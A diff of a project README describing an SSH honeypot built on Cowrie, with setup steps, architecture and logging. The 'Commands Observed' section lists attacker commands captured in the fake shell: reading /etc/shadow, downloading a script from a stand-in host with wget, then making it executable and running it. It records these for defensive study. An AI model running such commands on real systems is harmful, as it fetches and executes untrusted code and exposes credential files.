@@ -1,93 +1,157 @@
-# AI-Powered Honeypot System for Threat Detection
+# 🛡️ SSH Honeypot using Cowrie
 
-## Overview
-This project is an AI-assisted honeypot system designed to capture attacker activity and analyze malicious behavior using machine learning techniques.
+## 📌 Overview
 
-It uses a simulated SSH/Telnet environment to collect real attack data and processes it through a custom-built pipeline for anomaly detection.
+This project implements a fully functional SSH honeypot using Cowrie to simulate a vulnerable Linux server and capture attacker behavior in a controlled environment.
 
----
-
-## Architecture
-
-### 🛡️ Honeypot Layer (Data Source)
-- Uses Cowrie honeypot to simulate SSH/Telnet services
-- Captures attacker interactions and generates logs (`cowrie.json`)
+The system emulates a fake shell, logs malicious activities, and provides insights into real-world attack patterns such as brute-force login attempts, reconnaissance, and malware execution.
 
 ---
 
-### 📊 Data Processing Layer
-- Implemented using Python
-- Parses raw logs and extracts meaningful features
-- Key file:
-  - `log_reader.py` → processes and structures log data
+## ⚙️ Features
+
+* Fake SSH server running on port `2222`
+* Emulated Linux environment (fake filesystem + shell)
+* Real-time logging of attacker activity
+* Command tracking (whoami, ls, cat, wget, etc.)
+* Simulated malware execution attempts
+* Safe environment (no real system compromise)
 
 ---
 
-### 🤖 Machine Learning Layer
-- Built using:
-  - scikit-learn
-  - NumPy
-- Model used:
-  - MLPRegressor (used as an autoencoder for anomaly detection)
-- Detects unusual attacker behavior patterns
+## 🧠 Attack Simulation & Observations
+
+### 🔐 Login Behavior
+
+* Default credential-based access allowed (`root:rooot`)
+* Simulates weak authentication vulnerability
+
+### 💻 Commands Observed
+
+```
+ls
+cd
+pwd
+whoami
+cat /etc/passwd
+cat /etc/shadow
+wget http://test.com/file.sh
+chmod +x file.sh
+./file.sh
+```
+
+### 🔍 Behavioral Analysis
+
+* **Reconnaissance** → `ls`, `pwd`
+* **Privilege Check** → `whoami`
+* **Credential Harvesting** → `/etc/passwd`, `/etc/shadow`
+* **Payload Delivery** → `wget`
+* **Execution Attempt** → `chmod +x`, `./file.sh`
+
+### 🚫 Security Controls
+
+* Outbound network requests blocked
+* Fake file system prevents real data exposure
+* Malware execution is simulated, not real
 
 ---
 
-### 🧪 Data Generation Layer
-- Custom synthetic data generator
-- Key file:
-  - `fake_environment_generator.py`
-- Uses:
-  - `random` module to simulate realistic system responses
+## 🏗️ Architecture
+
+```
+Attacker
+   ↓
+SSH Connection (Port 2222)
+   ↓
+Cowrie Honeypot
+   ↓
+Fake Shell Environment
+   ↓
+Logging Engine (cowrie.log / JSON logs)
+```
 
 ---
 
-### ⚙️ Orchestration Layer
-- Central pipeline controller:
-  - `project_runner.py`
-- Connects all modules:
-  - Data collection → processing → ML → output
+## 📂 Project Structure
+
+```
+├── cowrie/
+├── cowrie-env/
+├── var/log/cowrie/
+│   └── cowrie.log
+├── etc/
+│   └── cowrie.cfg
+```
 
 ---
 
-## Tech Stack
-- Python
-- Cowrie Honeypot
-- scikit-learn
-- NumPy
+## 🚀 Setup & Usage
+
+### 1. Clone Repository
+
+```
+git clone <your-repo-link>
+cd <repo-name>
+```
+
+### 2. Create Virtual Environment
+
+```
+python3 -m venv cowrie-env
+source cowrie-env/bin/activate
+```
+
+### 3. Start Honeypot
+
+```
+./bin/cowrie start
+```
+
+### 4. Connect to Honeypot
+
+```
+ssh root@localhost -p 2222
+```
 
 ---
 
-## How It Works
-1. Cowrie captures attacker activity
-2. Logs are stored in `cowrie.json`
-3. `log_reader.py` processes and extracts features
-4. ML model analyzes behavior patterns
-5. Anomalies are detected and flagged
+## 📊 Logs & Monitoring
+
+Logs are stored in:
+
+```
+var/log/cowrie/cowrie.log
+```
+
+These logs capture:
+
+* Connection attempts
+* Login credentials used
+* Commands executed
+* Session duration
 
 ---
 
-## Project Structure
+## 🔧 Future Improvements
 
-core/
-┣ anomaly_detector.py
-┣ log_reader.py
-┗ fake_environment_generator.py
-
-pipeline/
-┗ project_runner.py
+* Custom credential database (`userdb.txt`)
+* Real-time dashboard for log visualization
+* Automated attack pattern detection
+* Deployment on public VPS for real-world data collection
 
 ---
 
-## My Contribution
-- Designed and implemented anomaly detection pipeline
-- Built log processing and feature extraction system
-- Developed synthetic environment generator
-- Integrated ML model for behavior analysis
+## 🎯 Key Learnings
+
+* Understanding attacker mindset and workflow
+* SSH protocol behavior and authentication flow
+* Honeypot design and security monitoring
+* Log analysis for cybersecurity insights
 
 ---
 
-## Future Improvements
-- Real-time dashboard for monitoring attacks
-- Advanced ML models for better accuracy
-- Automated threat classification
+## ⚠️ Disclaimer
+
+This project is for educational and research purposes only. Do not expose the system to the public internet without proper security controls.
+
+---
